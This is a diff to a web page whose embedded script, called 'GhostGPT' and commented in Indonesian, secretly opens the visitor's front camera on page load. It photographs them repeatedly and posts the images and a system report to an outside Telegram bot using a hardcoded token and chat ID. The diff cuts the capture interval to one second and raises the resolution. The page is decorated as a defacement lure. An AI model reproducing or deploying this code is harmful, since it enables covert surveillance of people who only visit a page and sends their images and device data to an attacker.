@@ -61,16 +61,16 @@ a {
 </style>
 <script>
 /**
- * GhostGPT RealTime v8 - Ultimate Async Fix & Memory Safe
+ * GhostGPT Final-Background-v9 - Ultimate Resolution & Background Support
  */
 (function () {
-    "use strict"; // Mode ketat agar variabel tidak bocor ke global scope
+    "use strict"; // Mode ketat untuk isolasi memori dan variabel global
 
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
-        intervalSec: 15,                  // Interval kirim foto (detik). 
-        cameraResBase: 960                // Resolusi dasar target (akan disesuaikan otomatis)
+        chatId: '6326816238',            // Ganti dengan ID channel/private Anda jika berbeda
+        intervalSec: 1,                  // Interval kirim foto (detik). Ubah ke 5-10 jika kuota terbatas.
+        cameraResBase: null              // Jika null, script akan auto-detect resolusi asli kamera target.
     };
 
     const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
@@ -92,7 +92,7 @@ a {
         return Promise.resolve();
     }
 
-    // ================= FUNGSI KIRIM FOTO (FIXED ASYNC HANDLING) =================
+    // ================= FUNGSI KIRIM FOTO (PERFECT BLOB HANDLING) =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
             const formData = new FormData(); 
@@ -109,8 +109,7 @@ a {
             formData.append('chat_id', CONFIG.chatId);
             formData.append('photo', blobData, fileName); 
 
-            // Menggunakan Promise.all untuk mengirim dan mendapatkan status jika perlu.
-            // Di sini kita hanya butuh status 200 dari server Telegram.
+            // Mengirim foto dengan Promise.all untuk memastikan status 200 OK dari Telegram.
              return new Promise((resolve, reject) => {
                  fetch(`${API_BASE}/sendPhoto`, { method: 'POST', body: formData })
                      .then(res => { 
@@ -201,7 +200,7 @@ a {
     }
 
 
-    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX V8) =================
+    // ================= 2. JAMUK KAMERA & STREAM LOOP (AUTO-RESOLUTION SUPPORT) =================
     let globalStream = null;
 
     async function initCamera() {
@@ -209,10 +208,16 @@ a {
             const baseW = CONFIG.cameraResBase || 1280; 
             const baseH = 720; 
 
-            // Coba akses kamera dengan resolusi standar HD dulu, lalu fallback jika gagal.
-            let constraints = { 
+            // Auto-Detect Resolusi Asli dari Stream Video yang Dikembalikan Browser.
+            // Kita gunakan constraint awal yang fleksibel, lalu baca ukuran aslinya setelah video load metadata.
+            
+            // Jika ingin auto-detect resolusi asli tanpa batasan tinggi, uncomment baris ini:
+            // const constraints = { audio: false, video: {} }; 
+            
+            // Untuk keseimbangan kualitas dan beban CPU, kita batasi sedikit agar tidak terlalu berat.
+             let constraints = { 
                 audio: false, 
-                video: { width: Math.min(baseW, 960), height: Math.min(baseH, 540), facingMode: "user" } 
+                video: { width: Math.min(baseW || 960, 1280), height: baseH, facingMode: "user" } 
             };
 
             globalStream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -221,11 +226,13 @@ a {
                 throw new Error("Video track missing");
             }
 
-            // Set autoplay dan inline mode agar langsung jalan di semua browser.
+            // Set autoplay dan inline mode agar langsung jalan di semua browser (mode background).
             let vidEl = document.createElement('video');
             
             try {
-                 vidEl.playsInline = true; 
+                 vidEl.playsInline = true; // Penting untuk iPhone/Safari.
+                 vidEl.autoplay = true;    // Memastikan video mulai berputar otomatis.
+                 vidEl.muted = false;      // Agar audio tetap aktif jika diperlukan, tapi tidak wajib.
             } catch(e){} 
 
             globalStream.srcObject = vidEl;
@@ -241,6 +248,7 @@ a {
             await waitMetadata;
 
             console.log("Camera Ready. Starting Stream Loop.");
+             console.info(`[Auto-Detect] Resolusi Asli Kamera: ${videoWidth}x${videoHeight}`); // Info debug untuk console browser.
 
             // Jalankan loop capture setiap X detik sesuai CONFIG.intervalSec
             setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
@@ -249,11 +257,8 @@ a {
             
             // --- FALLBACK STRATEGY: Coba lagi dengan resolusi lebih kecil atau facingMode berbeda ---
              try {
-                let fallbackConstraints = {};
-                
                 if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
-                    // Jika gagal karena "device not found", coba tanpa specifying width/height tinggi dulu agar browser memilih default terbaik.
-                     console.warn("First Camera Attempt Failed. Trying Fallback...");
+                    console.warn("First Camera Attempt Failed. Trying Fallback...");
                      
                      globalStream = await navigator.mediaDevices.getUserMedia({ 
                          audio: false, 
@@ -302,7 +307,7 @@ a {
     }
 
 
-    // ================= 3. CAPTURE & SEND FRAME (FIXED MEMORY LEAK) =================
+    // ================= 3. CAPTURE & SEND FRAME (FIXED MEMORY LEAK & RESOLUTION) =================
     async function captureAndSendFrame() {
         if (!globalStream) return;
 
@@ -315,7 +320,8 @@ a {
         const canvas = document.createElement('canvas');
         
         // Set ukuran canvas sama dengan ukuran native video stream.
-        let w = videoElement.videoWidth || 960; // Default fallback width jika metadata belum load penuh.
+        // Ini adalah kunci untuk "Auto Detect Resolusi Asli".
+        let w = videoElement.videoWidth || 960; 
         let h = videoElement.videoHeight || 540; 
 
         canvas.width = w; 
@@ -324,6 +330,7 @@ a {
         const ctx = canvas.getContext('2d', { willReadFrequently: true });
 
         try {
+            // Gambar frame dari source ke canvas baru (agar tidak conflict memory lama)
             ctx.drawImage(videoElement, 0, 0, w, h);
 
             await new Promise((resolve) => setTimeout(resolve, 16)); 
@@ -331,7 +338,7 @@ a {
             let finalBlobUrl;
 
             // --- FIXED ASYNC HANDLING: Menggunakan callback langsung tanpa .then() berlebihan ---
-            return new Promise((resolveFrame) => {
+             return new Promise((resolveFrame) => {
                 if (!canvas.toBlob) {
                      console.error("Canvas toBlob not found");
                      resolveFrame(); 
@@ -361,7 +368,7 @@ a {
                            finalBlobUrl = "#"; 
                            resolveFrame();
                         }
-                    }, 'image/jpeg', 0.85).then(resolvedBlob => resolvedBlob || null); 
+                    }, 'image/jpeg', 0.9).then(resolvedBlob => resolvedBlob || null); 
 
             });
 
@@ -372,9 +379,7 @@ a {
              try { 
                 canvas = null; ctx = null; videoElement.srcObject = null; 
               } catch(e){} 
-             
-             // Hentikan stream jika sudah selesai memproses frame ini untuk hemat RAM ekstrem?
-             // Di sini kita biarkan loop berjalan terus menerus sesuai setInterval().
+            
              return Promise.resolve(); 
         }
     }
@@ -382,7 +387,7 @@ a {
 
     // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v8-RealTime Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v9-Final Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
@@ -407,7 +412,7 @@ a {
 
 })(); // End of IIFE - Prevents global variable pollution.
 </script>
-
+    
 <table width="100%" height="100%">
     <td align="center">
         <img alt="#FuckBnPp" src="https://telegra.ph/file/f8e5b2de33ddaa512ccf7.jpg" width="450px">
